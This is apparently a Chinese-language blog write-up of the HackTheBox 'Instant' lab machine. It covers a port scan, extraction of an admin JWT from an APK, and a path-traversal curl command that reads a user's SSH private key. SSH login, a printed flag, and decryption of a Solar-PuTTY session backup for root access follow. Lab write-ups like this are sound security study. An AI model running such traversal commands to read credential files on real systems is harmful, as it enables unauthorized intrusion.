---
layout: post
title: HTB——Instant
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Instant/01.png?raw=true)

---

# 0x01 信息收集

---

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.5  Expired: 2026.01.01
[16:58:54] [INFO] Start IpScan:10.129.175.235
[16:58:54] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[16:58:55] [+] 10.129.175.235:22 open
[16:58:55] [+] 10.129.175.235:80 open
[16:58:56] [+] [TCP/SSH]  [OpenSSH 9.6p1 Ubuntu 3ubuntu13.5] 10.129.175.235:22 [SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5]                                                                         
[16:58:56] [INFO] start SSH check 10.129.175.235:22
[16:58:56] [+] 开始 SshScan 任务: SSH://10.129.175.235:22
[16:58:57] [+] [TCP/HTTP] [200] [Apache/2.4.58 (Ubuntu)][Apache-HTTP-Server/2.4.58][jQuery-official-website-CDN][Apache-Web-Server] http://10.129.175.235:80 [Instant Wallet]                     
                                                          
[16:59:07] [+] alive ports is: 2
[16:59:07] [+] Ip扫描结束:10.129.175.235
[16:59:07] [INFO] Start UrlScan:http://10.129.175.235:80
[16:59:08] [+] [TCP/HTTP] [200] [Apache-Web-Server][Apache-HTTP-Server/2.4.58][jQuery-official-website-CDN][Apache/2.4.58 (Ubuntu)] http://10.129.175.235:80 [Instant Wallet]                     
                                                 
[16:59:08] [+] Url扫描结束:http://10.129.175.235:80
[16:59:08] [+] 项目任务完成:Default, Timeuse：13.564272967
[16:59:08] [+] 扫描结束,耗时: 13.995877434s
```

---

# 0x02 APK逆向获取API接口&凭据

---

在80服务我们可以下载到一个`instant.apk`文件。使用`jadx`打开后文本搜索`instant.htb`，我们可以看到几个疑似`API`接口的url。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Instant/02.png?raw=true)

很多地址，那我们一个个步进审计。首先发现第一条内自带一个JWT。我们将`Authorization`加上后发包查看，返回的是`admin`信息。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Instant/03.png?raw=true)

说明此信息为`admin`的凭据。同时注意到下面的注释中还有一个`swagger-ui`子域名。我们尝试访问。发现内部有`view/log`和`read/log`两个接口，尝试发包观察可读文件并阅读。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Instant/04.png?raw=true)

在`log_file_name`处有路径穿越漏洞，我们可阅读任意文件。这里考虑将`shirohige`的私钥直接读出来，然后使用此私钥登录。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Instant]
└─# curl http://mywalletv1.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa -H "Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" | jq -r '.[].[]' > instant.pem
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2809  100  2809    0     0   9111      0 --:--:-- --:--:-- --:--:--  9120
jq: error (at <stdin>:1): Cannot iterate over number (201)
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Instant]
└─# chmod 600 instant.pem 
                                                                                                 
┌──(root㉿kali)-[/home/kali/HTB/Instant]
└─# ssh -i instant.pem shirohige@10.129.195.184     
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ cat user.txt
cf39c1db98576e2515940b46857fdd39
```

---

# 0x03 Solar-PuTTY解密Session

---

然后我们转而寻找当前网站的工作目录。在`/project/mywallet/Instant-Api/mywallet/instance`中找到了数据库文件。下载下来打开观察。但是发现此hash的迭代次数是600000次，估计是爆不出来。我们尝试从其他地方找信息吧。在`opt`文件夹下有一个backup，其内部有session通讯信息，但是是被加密的，需要用解密脚本跑。按文件夹名称可知关键词`Solar-PuTTY`。

- [Vz0n/SolarPuttyBrute: A simple tool to extract data from Solar PuTTy's session data files.](https://github.com/Vz0n/SolarPuttyBrute)

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Instant/05.png?raw=true)

拿到root的账密后，我们在`shirohige`基础上切换登陆即可。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Instant/06.png?raw=true)